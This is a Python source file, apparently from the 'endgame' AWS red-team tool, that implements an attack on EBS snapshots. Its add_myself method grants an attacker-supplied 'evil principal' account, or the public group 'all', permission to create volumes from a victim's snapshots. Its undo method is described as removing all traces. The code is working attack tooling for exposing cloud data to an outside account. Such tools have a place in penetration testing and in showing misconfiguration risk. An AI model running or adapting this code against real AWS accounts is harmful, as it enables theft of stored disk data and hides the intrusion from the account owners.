import logging
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_resource_path_from_arn, get_account_from_arn
from endgame.exposure_via_resource_policies.common import ResourceTypes
from endgame.exposure_via_sharing_apis.common import ResourceSharingApi, ResponseGetSharingApi
from endgame.shared.list_resources_response import ListResourcesResponse

logger = logging.getLogger(__name__)


class EbsSnapshot(ResourceSharingApi, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.service = "ebs"
        self.resource_type = "snapshot"
        self.region = region
        self.current_account_id = current_account_id
        self.name = name
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:ec2:{self.region}:{self.current_account_id}:{self.resource_type}/{self.name}"

    def _get_shared_with_accounts(self) -> ResponseGetSharingApi:
        logger.debug("Getting snapshot status policy for %s" % self.arn)
        shared_with_accounts = []
        try:
            # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_snapshot_attribute
            response = self.client.describe_snapshot_attribute(
                Attribute="createVolumePermission",
                SnapshotId=self.name,
            )
            attributes = response.get("CreateVolumePermissions")
            for attribute in attributes:
                if attribute.get("Group"):
                    if attribute.get("Group") == "all":
                        shared_with_accounts.append("all")
                if attribute.get("UserId"):
                    shared_with_accounts.append(attribute.get("UserId"))
            success = True
        except botocore.exceptions.ClientError as error:
            logger.debug(error)
            success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal="", victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=shared_with_accounts,
                                                 updated_policy=[]
                                                 )
        return response_message

    def share(self, accounts_to_add: list, accounts_to_remove: list) -> ResponseGetSharingApi:
        shared_with_accounts = []
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.modify_snapshot_attribute
        try:
            if accounts_to_add:
                logger.debug(f"Sharing the snapshot {self.name} with the accounts {', '.join(accounts_to_add)}")
                if "all" in accounts_to_add:
                    self.client.modify_snapshot_attribute(
                        Attribute="createVolumePermission",
                        SnapshotId=self.name,
                        GroupNames=["all"],
                        OperationType="add",
                    )
                else:
                    self.client.modify_snapshot_attribute(
                        Attribute="createVolumePermission",
                        SnapshotId=self.name,
                        UserIds=accounts_to_add,
                        OperationType="add",
                    )
            if accounts_to_remove:
                logger.debug(f"Removing access to the snapshot {self.name} from the accounts {', '.join(accounts_to_add)}")
                if "all" in accounts_to_remove:
                    self.client.modify_snapshot_attribute(
                        Attribute="createVolumePermission",
                        SnapshotId=self.name,
                        GroupNames=["all"],
                        OperationType="remove",
                    )
                else:
                    self.client.modify_snapshot_attribute(
                        Attribute="createVolumePermission",
                        SnapshotId=self.name,
                        UserIds=accounts_to_remove,
                        OperationType="remove",
                    )
            shared_with_accounts = self._get_shared_with_accounts().shared_with_accounts
            success = True
        except botocore.exceptions.ClientError:
            success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal="", victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=self.original_shared_with_accounts
                                                 )
        return response_message

    def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseGetSharingApi:
        """Add your rogue principal to the AWS resource"""
        evil_account_id = self.parse_evil_principal(evil_principal=evil_principal)
        logger.debug(f"Sharing {self.arn} with {evil_account_id}")
        shared_with_accounts = []
        if not dry_run:
            accounts_to_add = [evil_account_id]
            share_response = self.share(accounts_to_add=accounts_to_add, accounts_to_remove=[])
            shared_with_accounts = share_response.shared_with_accounts
            success = share_response.success
        else:
            try:
                # this is just to get the success message
                tmp = self._get_shared_with_accounts()
                success = tmp.success
                shared_with_accounts = tmp.shared_with_accounts
                shared_with_accounts.append(evil_account_id)
            except botocore.exceptions.ClientError as error:
                logger.debug(error)
                success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal=evil_principal, victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=shared_with_accounts
                                                 )
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseGetSharingApi:
        """Remove all traces"""
        evil_account_id = self.parse_evil_principal(evil_principal=evil_principal)
        logger.debug(f"Removing {evil_account_id} access to {self.arn}")
        shared_with_accounts = []
        if not dry_run:
            accounts_to_remove = [evil_account_id]
            share_response = self.share(accounts_to_add=[], accounts_to_remove=accounts_to_remove)
            shared_with_accounts = share_response.shared_with_accounts
            success = share_response.success
        else:
            shared_with_accounts = self.shared_with_accounts
            if evil_account_id in shared_with_accounts:
                shared_with_accounts.remove(evil_account_id)
            success = True
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal=evil_principal, victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=shared_with_accounts
                                                 )
        return response_message

    def parse_evil_principal(self, evil_principal: str) -> str:
        if ":" in evil_principal:
            evil_account_id = get_account_from_arn(evil_principal)
        # RDS requires publicly shared snapshots to be supplied via the value "all"
        elif evil_principal == "*":
            evil_account_id = "all"
        # Otherwise, the evil_principal is an account ID
        else:
            evil_account_id = evil_principal
        return evil_account_id


class EbsSnapshots(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "ebs"
        self.resource_type = "snapshot"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Paginator.DescribeSnapshots
        paginator = self.client.get_paginator("describe_snapshots")
        # Apply a filter, otherwise we get public EBS snapshots too, from randos on the internet.
        page_iterator = paginator.paginate(Filters=[
            {
                "Name": "owner-id",
                "Values": [self.current_account_id]
            }
        ])
        for page in page_iterator:
            these_resources = page["Snapshots"]
            for resource in these_resources:
                snapshot_id = resource.get("SnapshotId")
                kms_key_id = resource.get("KmsKeyId")
                volume_id = resource.get("VolumeId")
                arn = f"arn:aws:ec2:{self.region}:{self.current_account_id}:snapshot/{snapshot_id}"
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=snapshot_id)
                resources.append(list_resources_response)
        return resources
